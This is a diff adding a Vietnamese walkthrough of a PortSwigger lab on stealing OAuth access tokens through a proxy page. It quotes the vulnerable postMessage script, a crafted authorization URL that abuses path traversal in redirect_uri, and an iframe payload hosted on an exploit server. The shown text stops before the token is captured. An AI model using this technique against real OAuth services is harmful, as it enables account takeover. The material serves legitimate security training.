@@ -200,4 +200,43 @@ Giải thích: đoạn `window.location = '/?'+document.location.hash.substr(1)`
 
 <img width="583" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3cb15e1c-6119-4148-8f6d-318e54148f2c">
 
+***
+
+## 5. Lab: Stealing OAuth access tokens via a proxy page
+
+* Content:
+```
+This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.
+
+To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.
+
+The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
+
+You can log in via your own social media account using the following credentials: wiener:peter.
+```
+* Exploit:
+
+Lab này tương tự như Lab #4, tuy nhiên không còn chức năng view next post để có thể lợi dụng chuyển hướng victim request đến page của attacker nữa.
+Tuy nhiên bài này có 1 tính năng khác có thể bị lợi dụng là: khi thực hiện post comment lên thì ứng dụng gọi đến `/post/comment/comment-form` để lấy giá trị người dùng nhập vào sau đó mới chuyển lên cửa sổ cha (windows hoặc iframe khác) để thực hiện post comment thông qua đoạn code javascript bên dưới đây:
+```javascript
+       <script>
+            parent.postMessage({type: 'onload', data: window.location.href}, '*')
+            function submitForm(form, ev) {
+                ev.preventDefault();
+                const formData = new FormData(document.getElementById("comment-form"));
+                const hashParams = new URLSearchParams(window.location.hash.substr(1));
+                const o = {};
+                formData.forEach((v, k) => o[k] = v);
+                hashParams.forEach((v, k) => o[k] = v);
+                parent.postMessage({type: 'oncomment', content: o}, '*');
+                form.reset();
+            }
+        </script>
+```
+
+Do vậy thực hiện phương thức như cách trong Lab #4, ta sẽ chuẩn bị 1 link URL như sau: `GET /auth?client_id=q9id6iqgkkwkytx9jb4jr&redirect_uri=https://0aa700bf0431cf8980cebcf900af00bf.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=792677125&scope=openid%20profile%20email` để gửi cho victim click vào thông qua Exploit Server.
+=> Trên Exploit Server nhúng 1 đoạn iframe để gửi đến victim:
+```html
+<iframe src='<HOST-LAB-DOMAIN>/auth?client_id=q9id6iqgkkwkytx9jb4jr&redirect_uri=https://0aa700bf0431cf8980cebcf900af00bf.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=792677125&scope=openid%20profile%20email'></iframe>
+```
 
